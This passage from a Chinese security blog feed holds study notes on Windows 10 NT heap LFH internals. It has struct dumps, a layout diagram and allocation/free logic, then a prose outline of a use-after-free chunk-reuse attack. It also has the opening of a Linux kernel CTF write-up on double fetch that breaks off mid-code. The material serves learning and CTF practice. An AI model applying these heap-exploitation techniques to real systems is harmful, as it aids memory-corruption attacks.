class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _HEAP_BUCKET</span><br><span class="line">ntdll!_HEAP_BUCKET</span><br><span class="line">    +<span class="number">0x000</span> BlockUnits       : Uint2B</span><br><span class="line">    +<span class="number">0x002</span> SizeIndex        : UChar</span><br><span class="line">    +<span class="number">0x003</span> UseAffinity      : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">    +<span class="number">0x003</span> DebugFlags       : Pos <span class="number">1</span>, <span class="number">2</span> Bits</span><br><span class="line">    +<span class="number">0x003</span> Flags            : UChar</span><br></pre></td></tr></table></figure><p>其中一些比较重要的成员：</p><ul><li><code>BlockUnits(+0x0: 2B)</code>：要分配出去的一个block的大小，实际存放是<code>size &gt;&gt; 4</code>。</li><li><code>SizeIndex(+0x2: 1B)</code>：使用者需要的大小，实际存放是<code>size &gt;&gt; 4</code>。</li></ul><h3 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h3><p>结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">ntdll!_HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">    +<span class="number">0x000</span> LocalData        : Ptr64 _HEAP_LOCAL_DATA</span><br><span class="line">    +<span class="number">0x008</span> ActiveSubsegment : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x010</span> CachedItems      : [<span class="number">16</span>] Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x090</span> SListHeader      : _SLIST_HEADER</span><br><span class="line">    +<span class="number">0x0a0</span> Counters         : _HEAP_BUCKET_COUNTERS</span><br><span class="line">    +<span class="number">0x0a8</span> LastOpSequence   : Uint4B</span><br><span class="line">    +<span class="number">0x0ac</span> BucketIndex      : Uint2B</span><br><span class="line">    +<span class="number">0x0ae</span> LastUsed         : Uint2B</span><br><span class="line">    +<span class="number">0x0b0</span> NoThrashCount    : Uint2B</span><br></pre></td></tr></table></figure><p>其中一些比较重要的成员：</p><ul><li><code>LocalData(+0x0: 8B)</code>：一个<code>_HEAP_LOCAL_DATA</code>结构体指针，指向<code>_LFH_HEAP-&gt;LocalData</code>，方便从<code>_HEAP_LOCAL_SEGMENT_INFO</code>找回<code>_LFH_HEAP</code>。</li><li><code>BucketIndex(+0xAC: 2B)</code>：对应到的<code>BucketIndex</code>，也就是<code>_LFH_HEAP-&gt;SegmentInfoArrays</code>数组中对应的下标。</li><li><code>ActiveSubsegment(+0x8: 8B)</code>：非常重要的成员，一个<code>_HEAP_SUBSEGMENT</code>结构体指针，目的在于管理<code>UserBlocks</code>，记录剩余等多chunk、该<code>UserBlocks</code>最大分配数等信息。</li><li><code>CachedItems</code>：一个存放16个<code>_HEAP_SUBSEGMENT</code>结构体指针的数组，存放对应到该<code>_HEAP_LOCAL_SEGMENT_INFO</code>且还有可以分配chunk给用户的<code>_HEAP_SUBSEGMENT</code>指针；可以理解为一个内存池，当<code>ActiveSubsegment</code>没有可用chunk的时候，即用完的时候，就从<code>CachedItems</code>选择填充，替换掉<code>ActiveSubsegment</code>。</li></ul><h3 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h3><p>结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _HEAP_SUBSEGMENT</span><br><span class="line">ntdll!_HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x000</span> LocalInfo        : Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">    +<span class="number">0x008</span> UserBlocks       : Ptr64 _HEAP_USERDATA_HEADER</span><br><span class="line">    +<span class="number">0x010</span> DelayFreeList    : _SLIST_HEADER</span><br><span class="line">    +<span class="number">0x020</span> AggregateExchg   : _INTERLOCK_SEQ</span><br><span class="line">    +<span class="number">0x024</span> BlockSize        : Uint2B</span><br><span class="line">    +<span class="number">0x026</span> Flags            : Uint2B</span><br><span class="line">    +<span class="number">0x028</span> BlockCount       : Uint2B</span><br><span class="line">    +<span class="number">0x02a</span> SizeIndex        : UChar</span><br><span class="line">    +<span class="number">0x02b</span> AffinityIndex    : UChar</span><br><span class="line">    +<span class="number">0x024</span> Alignment        : [<span class="number">2</span>] Uint4B</span><br><span class="line">    +<span class="number">0x02c</span> Lock             : Uint4B</span><br><span class="line">    +<span class="number">0x030</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p>其中一些比较重要的成员：</p><ul><li><code>LocalInfo(+0x0: 8B)</code>：一个指回到对应<code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体位置的指针。</li><li><code>UserBlocks(+0x8: 8B)</code>：一个指向<code>_HEAP_USERDATA_HEADER</code>结构的指针（后面会对<code>_HEAP_USERDATA_HEADER</code>进行分析），也就是指向LFH chunk的内存分配池。该内存分配池包括一个<code>_HEAP_USERDATA_HEADER</code>，存放一些metatdata；紧跟着后面会有要分配出去的所有chunk。</li><li><code>AggregateExchg(+0x20: 4B)</code>：一个<code>_INTERLOCK_SEQ</code>结构（后面会对<code>_INTERLOCK_SEQ</code>进行分析），储存对应的<code>UserBlocks</code>的状态信息。</li><li><code>BlockSize(+0x24: 2B)</code>：该<code>UserBlocks</code>中每个chunk的大小。</li><li><code>BlockCount(+0x28: 2B)</code>：该<code>UserBlocks</code>中chunk的总个数。</li><li><code>SizeIndex(+0x2A: 1B)</code>：该<code>UserBlocks</code>对应的index。</li></ul><h3 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h3><p>结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _INTERLOCK_SEQ</span><br><span class="line">ntdll!_INTERLOCK_SEQ</span><br><span class="line">    +<span class="number">0x000</span> Depth            : Uint2B</span><br><span class="line">    +<span class="number">0x002</span> Hint             : Pos <span class="number">0</span>, <span class="number">15</span> Bits</span><br><span class="line">    +<span class="number">0x002</span> Lock             : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">    +<span class="number">0x002</span> Hint16           : Uint2B</span><br><span class="line">    +<span class="number">0x000</span> Exchg            : Int4B</span><br></pre></td></tr></table></figure><p>一些重要的成员：</p><ul><li><code>Depth(+0x0: 2B)</code>：用来管理对应到的<code>UserBlocks</code>还有多少freed chunk，LFH会用这个判断是否还从该UserBlock进行分配。</li><li><code>Lock(+0x2: 1Bit)</code>：Lock，即提供锁的作用，其实只占用第4 byte的最后一个bit。</li></ul><h3 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h3><p>结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _HEAP_USERDATA_HEADER</span><br><span class="line">ntdll!_HEAP_USERDATA_HEADER</span><br><span class="line">    +<span class="number">0x000</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> SubSegment       : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">    +<span class="number">0x008</span> Reserved         : Ptr64 Void</span><br><span class="line">    +<span class="number">0x010</span> SizeIndexAndPadding : Uint4B</span><br><span class="line">    +<span class="number">0x010</span> SizeIndex        : UChar</span><br><span class="line">    +<span class="number">0x011</span> GuardPagePresent : UChar</span><br><span class="line">    +<span class="number">0x012</span> PaddingBytes     : Uint2B</span><br><span class="line">    +<span class="number">0x014</span> Signature        : Uint4B</span><br><span class="line">    +<span class="number">0x018</span> EncodedOffsets   : _HEAP_USERDATA_OFFSETS</span><br><span class="line">    +<span class="number">0x020</span> BusyBitmap       : _RTL_BITMAP_EX</span><br><span class="line">    +<span class="number">0x030</span> BitmapData       : [<span class="number">1</span>] Uint8B</span><br></pre></td></tr></table></figure><p>一些重要成员：</p><ul><li><code>SubSegment(+0x0: 8B)</code>：指回对应的<code>_HEAP_SUBSEGMENT</code>结构。</li><li><code>EncodedOffsets(+0x18: 8B)</code>：一个<code>_HEAP_USERDATA_OFFSETS</code>结构，用来验证chunk header是否被改过。</li><li><code>BusyBitmap(+0x20: 10B)</code>：记录该<code>UserBlocks</code>那些chunk被使用了。</li></ul><h3 id="HEAP-ENTRY-1"><a href="#HEAP-ENTRY-1" class="headerlink" title="_HEAP_ENTRY"></a>_HEAP_ENTRY</h3><p>结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">002</span>&gt; dt _HEAP_ENTRY</span><br><span class="line">ntdll!_HEAP_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> UnpackedEntry    : _HEAP_UNPACKED_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> PreviousBlockPrivateData : Ptr64 Void</span><br><span class="line">    +<span class="number">0x008</span> Size             : Uint2B</span><br><span class="line">    +<span class="number">0x00a</span> Flags            : UChar</span><br><span class="line">    +<span class="number">0x00b</span> SmallTagIndex    : UChar</span><br><span class="line">    +<span class="number">0x008</span> SubSegmentCode   : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> PreviousSize     : Uint2B</span><br><span class="line">    +<span class="number">0x00e</span> SegmentOffset    : UChar</span><br><span class="line">    +<span class="number">0x00e</span> LFHFlags         : UChar</span><br><span class="line">    +<span class="number">0x00f</span> UnusedBytes      : UChar</span><br><span class="line">    +<span class="number">0x008</span> CompactHeader    : Uint8B</span><br><span class="line">    +<span class="number">0x000</span> ExtendedEntry    : _HEAP_EXTENDED_ENTRY</span><br><span class="line">    +<span class="number">0x000</span> Reserved         : Ptr64 Void</span><br><span class="line">    +<span class="number">0x008</span> FunctionIndex    : Uint2B</span><br><span class="line">    +<span class="number">0x00a</span> ContextValue     : Uint2B</span><br><span class="line">    +<span class="number">0x008</span> InterceptorValue : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> UnusedBytesLength : Uint2B</span><br><span class="line">    +<span class="number">0x00e</span> EntryOffset      : UChar</span><br><span class="line">    +<span class="number">0x00f</span> ExtendedBlockSignature : UChar</span><br><span class="line">    +<span class="number">0x000</span> ReservedForAlignment : Ptr64 Void</span><br><span class="line">    +<span class="number">0x008</span> Code1            : Uint4B</span><br><span class="line">    +<span class="number">0x00c</span> Code2            : Uint2B</span><br><span class="line">    +<span class="number">0x00e</span> Code3            : UChar</span><br><span class="line">    +<span class="number">0x00f</span> Code4            : UChar</span><br><span class="line">    +<span class="number">0x00c</span> Code234          : Uint4B</span><br><span class="line">    +<span class="number">0x008</span> AgregateCode     : Uint8B</span><br></pre></td></tr></table></figure><p>其中重要的成员：</p><ul><li><code>SubSegmentCode(+0x8: 4B)</code>：encode过的metadata，用来推回<code>UserBlocks</code>的位置。</li><li><code>PreviousSize(+0xC: 2B)</code>：该chunk在UserBlock中的index，实际上是第0xD个byte。</li><li><code>UnusedBytes(+0xF: 1B)</code>：用来判断该LFH chunk是否为freed状态，如果是busy状态，则为<code>0x80</code>。</li></ul><h3 id="一些补充"><a href="#一些补充" class="headerlink" title="一些补充"></a>一些补充</h3><p><code>_HEAP_USERDATA_HEADER-&gt;EncodedOffsets</code>在<code>UserBlocks</code>初始化的时候设置，其算法为下面四个值进行xor：</p><ul><li>(sizeof(_HEAP_USERDATA_HEADER)) | ((_HEAP_BUCKET-&gt;BlockUnits) * 0x10 &lt;&lt; 16)</li><li>LFHkey</li><li><code>UserBlocks</code>的地址</li><li><code>_LFH_HEAP</code>的地址</li></ul><p>所有<code>UserBlocks</code>里的chunk header在初始化的时候都会经过xor，其算法为下面各个值得xor：</p><ul><li><code>_HEAP</code>的地址</li><li>LFHkey</li><li>chunk本身的地址<code>address &gt;&gt; 4</code></li><li>((chunk address) - (UserBLocks address)) &lt;&lt; 12</li></ul><h2 id="整个LFH的结构布局"><a href="#整个LFH的结构布局" class="headerlink" title="整个LFH的结构布局"></a>整个LFH的结构布局</h2><p>因为涉及的结构体多而杂乱，用图辅助比较好理解，因此依然使用Slides中的图来说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                         _HEAP_USERDATA_HEADER </span><br><span class="line">                                                                                                                    +--&gt;+---------------------+</span><br><span class="line">                                                                                                                    |   |      SubSegment     |</span><br><span class="line">         _HEAP                                                   _HEAP_BUCKET                                       |   +---------------------+</span><br><span class="line">+---------------------+                               +----&gt;+---------------------+                                 |   |         ...         |</span><br><span class="line">|         ...         |                               |     |      BlockUnits     |                                 |   +---------------------+</span><br><span class="line">+---------------------+              _LFH_HEAP        |     +---------------------+          _HEAP_SUBSEGMENT       |   |    EncodedOffsets   |</span><br><span class="line">|    EncodeFlagMask   |   +--&gt;+---------------------+ |     |       SizeIndex     |    +-&gt;+---------------------+   |   +---------------------+</span><br><span class="line">+---------------------+   |   |         ...         | |     +---------------------+  +-+--|      LocalInfo      |   |   |      BusyBitmap     |</span><br><span class="line">|       Encoding      |   |   +---------------------+ |     |         ...         |  | |  +---------------------+   |   +---------------------+</span><br><span class="line">+---------------------+   |   |        Heap         | | +--&gt;+---------------------+  | |  |      UserBlocks     |---+   |         ...         |</span><br><span class="line">|         ...         |   |   +---------------------+ | |                            | |  +---------------------+       +---------------------+</span><br><span class="line">+---------------------+   |   |         ...         | | |                            | |  |         ...         |       |     chunk header    |</span><br><span class="line">|     BlocksIndex     |   |   +---------------------+-+ |                            | |  +---------------------+----+  +---------------------+</span><br><span class="line">+---------------------+   |   |      Buckets[0]     |   |                            | |  |    AggregateExchg   |    |  |         ...         |</span><br><span class="line">|         ...         |   |   +---------------------+---+   _HEAP_LOCAL_SEGMENT_INFO | |  +---------------------+--+ |  +---------------------+</span><br><span class="line">+---------------------+   |   |         ...         |   +--&gt;+---------------------+  | |  |      BlockSize      |  | |  |     chunk header    |</span><br><span class="line">|       FreeList      |   |   +---------------------+   | +-|      LocalData      |&lt;-+ |  +---------------------+  | |  +---------------------+</span><br><span class="line">+---------------------+   |   | SegmentInfoArray[x] |---+ | +---------------------+    |  |      BlockCount     |  | |  |         ...         |</span><br><span class="line">|         ...         |   |   +---------------------+     | |   ActiveSubsegment  |----+  +---------------------+  | |  +---------------------+</span><br><span class="line">+---------------------+   |   |         ...         |     | +---------------------+       |         ...         |  | |  |     chunk header    |</span><br><span class="line">|     FrontEndHeap    |---+   +---------------------+     | |     CachedItems     |       +---------------------+  | |  +---------------------+</span><br><span class="line">+---------------------+       |      LocalData      |&lt;----+ +---------------------+       |      SizeIndex      |  | |  |         ...         |</span><br><span class="line">|         ...         |       +---------------------+       |         ...         |       +---------------------+  | |  +---------------------+</span><br><span class="line">+---------------------+       |         ...         |       +---------------------+       |         ...         |  | |  </span><br><span class="line">|FrontEndHeapUsageData|       +---------------------+       |     BucketIndex     |       +---------------------+  | |       _INTERLOCK_SEQ</span><br><span class="line">+---------------------+                                     +---------------------+                                | +-&gt;+---------------------+</span><br><span class="line">|         ...         |                                     |         ...         |                                |    |        Depth        |</span><br><span class="line">+---------------------+                                     +---------------------+                                |    +---------------------+</span><br><span class="line">                                                                                                                   |    |    Hint(15 bits)    |</span><br><span class="line">                                                                                                                   |    +---------------------+</span><br><span class="line">                                                                                                                   |    |     Lock(1 bit)     |</span><br><span class="line">                                                                                                                   +---&gt;+---------------------+</span><br></pre></td></tr></table></figure><h2 id="分配机制-1"><a href="#分配机制-1" class="headerlink" title="分配机制"></a>分配机制</h2><h3 id="LFH的初始化"><a href="#LFH的初始化" class="headerlink" title="LFH的初始化"></a>LFH的初始化</h3><p>在Back-End中也对LFH也有所提及，也就是在<code>FrontEndHeapUsageData[x] &amp; 0x1F &gt; 0x10</code>的时候，置位<code>_HEAP-&gt;CompatibilityFlag |= 0x20000000</code>，下一次<code>Allocate</code>就会对LFH进行初始化：</p><ol><li>首先会ExtendFrontEndUsageData及增加更大的<code>_HEAP-&gt;BlocksIndex</code>，因为这里<code>_HEAP-&gt;BlocksIndex</code>可以理解为一个<code>_HEAP_LIST_LOOKUP</code>结构的单向链表（参考上面Back-End的解释），且默认初始情况下只存在一个管理比较小的（0x0 ~ 0x80）的chunk的<code>_HEAP_LIST_LOOKUP</code>，所以这里会扩展到（0x80 ~ 0x400），即在链表尾追加一个管理更大chunk的<code>_HEAP_LIST_LOOKUP</code>结构体结点。</li><li>建立并初始化<code>_HEAP-&gt;FrontEndHeap</code>（通过<code>mmap</code>），即初始化<code>_LFH_HEAP</code>的一些metadata。</li><li>建立并初始化<code>_LFH_HEAP-&gt;SegmentInfoArrays[x]</code>，在<code>SegmentInfoArrays[BucketIndex]</code>处填上对应的<code>_HEAP_LOCAL_SEGMENT_INFO</code>结构体指针。</li></ol><p>再接下来<code>Allocate</code>相同大小的chunk就会开始使用LFH：</p><ol><li>分配<code>UserBlocks</code>并进行初始化，即设置对应大小的chunk。</li><li>然后再设置对应<code>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</code>。</li><li>随机地从<code>UserBlocks</code>中返回一个chunk。</li></ol><h3 id="Allocate-RtlpLowFragHeapAllocFromContext"><a href="#Allocate-RtlpLowFragHeapAllocFromContext" class="headerlink" title="Allocate (RtlpLowFragHeapAllocFromContext)"></a>Allocate (RtlpLowFragHeapAllocFromContext)</h3><p>根据以下步骤：</p><ol><li>先看看<code>ActiveSubsegment</code>中有没有空闲的chunk，也就是通过<code>ActiveSubsegment-&gt;AggregateExchg.depth</code>（free chunk的个数）判断：<ul><li>如果没有则从<code>CacheedItems</code>中找，找到有存在空闲chunk的<code>Subsegment</code>就替换掉当前的<code>ActiveSubsegment</code>。</li><li>如果有则继续往下。</li></ul></li><li>取得<code>RtlpLowFragHeapRandomData[x]</code>上的值；且取值是依次循环取的，x为1 byte大小的值，即下一次<code>x = (x + 1) % 256</code>；由于<code>RtlpLowFragHeapRandomData</code>是一个存放256个随机数的数列（范围为<code>0x0 ~ 0x7F</code>），所以这里相当于在取随机数。</li><li>计算相应的<code>UserBlocks</code>里chunk的index，通过<code>RtlpLowFragHeapRandomData[x] * max_index &gt;&gt; 7</code>（其中<code>max_index</code>显然是能取到的最大的index）：<ul><li>如果发生了collision，即该index对应的chunk是busy的，那么往后取最近的；细节上，就是检查index对应到的bitmap是否为0，如果是0就返回对应的bitmap，否则选取最近的下一个。</li><li>如果没有发生，则继续往下。</li></ul></li><li>检查<code>chunk-&gt;UnusedBytes &amp; 0x3F != 0</code>，因为满足此式表示chunk是free状态的，否则状态非法；该过程中还会设置对应的bitmap，以及更新<code>ActiveSubsegment-&gt;AggregateExchg.depth</code>等相关信息。</li><li>最后设置index（即<code>chunk-&gt;PreviousSize</code>）以及<code>chunk-&gt;UnusedBytes</code>，并把chunk返回给用户。</li></ol><h3 id="Free-RtlFreeHeap"><a href="#Free-RtlFreeHeap" class="headerlink" title="Free (RtlFreeHeap)"></a>Free (RtlFreeHeap)</h3><p>根据以下步骤：</p><ol><li>首先更新<code>chunk-&gt;UnusedBytes</code>。</li><li>找到该chunk对应的在<code>UserBlocks</code>中的index，并且置<code>UserBlocks-&gt;BusyBitmap</code>对应的bit为0。</li><li>更新<code>ActiveSubsegment-&gt;AggregateExchg</code>。</li><li>如果该chunk不属于当前的<code>ActiveSubsegment</code>则看能不能放进<code>CachedItems</code>中去，如果可以就放进去。</li></ol><h2 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>从Slides上面看，只提到了一种Reuse attack，如下面的情况：<br>假如我们拥有UAF的漏洞可以利用，但是因为LFH分配的随机性，我们无法预测下一个那到的chunk是在哪个位置，也就是说现在我们free的chunk，下一次malloc不一定拿得到。<br>那么此时可以通过填满<code>UserBlocks</code>的方式，再free掉目标chunk，这样下一次malloc就必然会拿到目标chunk（因为只剩下一个），然后可以利用这个特性构造chunk overlap做进一步利用。<br>当然这只是提了一种利用思路，至于其他的还需要慢慢摸索，具体情况下还需做特定的分析利用。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version" target="_blank" rel="noopener">https://www.slideshare.net/AngelBoy1/windows-10-nt-heap-exploitation-chinese-version</a></li><li><a href="https://www.anquanke.com/post/id/180372" target="_blank" rel="noopener">https://www.anquanke.com/post/id/180372</a></li><li><a href="https://bbs.pediy.com/thread-246570.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246570.htm</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近正学习windows下的堆利用，本着扩展知识面再加上以后很大概率会用到的想法，从零开始学起，主要是从AngelBoy大神的Slides里面，再加上网上搜到的各种资料以及手动调试分析，试着去了解一下windows heap的管理机制。&lt;/p&gt;
&lt;p&gt;不同于linux，由于windows是闭源的，一下子难以摸清，所以该篇会不断更新，目的仅是为了加深印象以及作为以后的参考。&lt;/p&gt;
    
    </summary>
    
    
      <category term="LearningNotes" scheme="https://n0nop.com/categories/LearningNotes/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
      <category term="Windows" scheme="https://n0nop.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn: kernoob -- 不仅仅是double fetch</title>
    <link href="https://n0nop.com/2021/03/29/kernel-pwn-kernoob-%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AFdouble-fetch/"/>
    <id>https://n0nop.com/2021/03/29/kernel-pwn-kernoob-%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AFdouble-fetch/</id>
    <published>2021-03-29T08:25:34.000Z</published>
    <updated>2021-03-31T05:27:08.682Z</updated>
    
    <content type="html"><![CDATA[<p>拿去年高校战疫分享赛的一道kernel pwn题作为小白鼠，尝试多种内核利用方法，也踩了不少坑。不过还是学到了不少东西。</p><a id="more"></a><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h2><p>Double Fetch从漏洞原理上来说，属于条件竞争（race condition）的漏洞，是一种内核态与用户态之间的数据访问竞争。</p><p>借用<a href="https://ctf-wiki.org/pwn/linux/kernel/double-fetch/" target="_blank" rel="noopener">CTF Wiki</a>里的一张图：<br><img src="/2021/03/29/kernel-pwn-kernoob-%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AFdouble-fetch/double-fetch.png" alt="double fetch"><br>通俗地来讲，就是在kernel中，可能存在对一个user data进行两次访问的情况，而且第一次为检查，第二次才是真正的使用。那么在检查和使用两者之间，存在着时间窗口，使得user data可能在期间被修改，也就是说被检查的值和被使用的值前后不一致，从而导致检查无效而被绕过。</p><h2 id="SLAB-FREELIST-HARDENED"><a href="#SLAB-FREELIST-HARDENED" class="headerlink" title="SLAB_FREELIST_HARDENED"></a>SLAB_FREELIST_HARDENED</h2><p><code>SLAB_FREELIAT_HARDENED</code>是一种内核保护机制，虽然它并不常见。但是要做这道题，（或许也可以不需要知道）了解一下它也很有好处。</p><p>在这个保护机制中，<code>kmem_cache</code>增加了一个<code>unsigned long</code>类型的变量random：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line"><span class="keyword">slab_flags_t</span> flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">size</span>;<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line"><span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line"><span class="keyword">int</span> offset;<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="keyword">int</span> cpu_partial;<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> allocflags;<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line"><span class="keyword">int</span> refcount;<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line"><span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line"><span class="keyword">int</span> inuse;<span class="comment">/* Offset to metadata */</span></span><br><span class="line"><span class="keyword">int</span> align;<span class="comment">/* Alignment */</span></span><br><span class="line"><span class="keyword">int</span> reserved;<span class="comment">/* Reserved bytes at the end of slabs 